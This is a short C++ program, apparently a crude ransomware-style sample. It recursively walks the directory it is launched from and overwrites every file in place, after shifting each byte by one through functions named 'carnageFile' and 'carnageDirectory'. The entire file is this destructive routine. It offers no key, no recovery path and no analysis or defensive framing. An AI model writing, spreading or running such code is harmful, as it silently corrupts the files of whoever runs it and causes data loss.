#include <iostream>
#include <fstream>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

using namespace std;

// Function to encrypt a single file
void carnageFile(std::string filePath)
{
    std::fstream file, tempFile;
    std::string tempFilePath = "temp.txt";
    file.open(filePath, std::ios::in);
    tempFile.open(tempFilePath, std::ios::out);
    char byte;
    while (file >> std::noskipws >> byte)
    {
        byte += 1;
        tempFile << byte;
    }
    file.close();
    tempFile.close();
    file.open(filePath, std::ios::out);
    tempFile.open(tempFilePath, std::ios::in);
    while (tempFile >> std::noskipws >> byte)
    {
        file << byte;
    }
    file.close();
    tempFile.close();
    remove(tempFilePath.c_str());
}

/* This function will read all directories and files in the directory specified in parameter,
 * if it finds a file it encrypts it
 * if it finds a directory, it will read all its contents and repeat the encryption operation until all directories are encrypted
 */
void carnageDirectory(std::string directoryPath)
{
    DIR *dir;
    struct dirent *ent;
    struct stat fileStatus;
    std::string filePath;
    if ((dir = opendir(directoryPath.c_str())) != NULL)
    {

        while ((ent = readdir(dir)) != NULL)
        {
            filePath = directoryPath + "/" + ent->d_name;
            if (stat(filePath.c_str(), &fileStatus) < 0)
                continue;
            if (S_ISDIR(fileStatus.st_mode))
            {
                if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
                    continue;
                carnageDirectory(filePath);
            }
            else
            {
                carnageFile(filePath);
            }
        }
        closedir(dir);
    }
    else
    {
        std::cout << "Could not open directory " << directoryPath << std::endl;
    }
}

// We get in a string the directory in which the program is launched and we encrypt all the files in it.
int main()
{
    char buffer[FILENAME_MAX];
    std::string currentDirectory;
    if (getcwd(buffer, FILENAME_MAX) != nullptr)
    {
        currentDirectory = buffer;
    }
    else
    {
        std::cerr << "Error please reload the program" << std::endl;
        return 1;
    }
    carnageDirectory(currentDirectory);
    return 0;
}
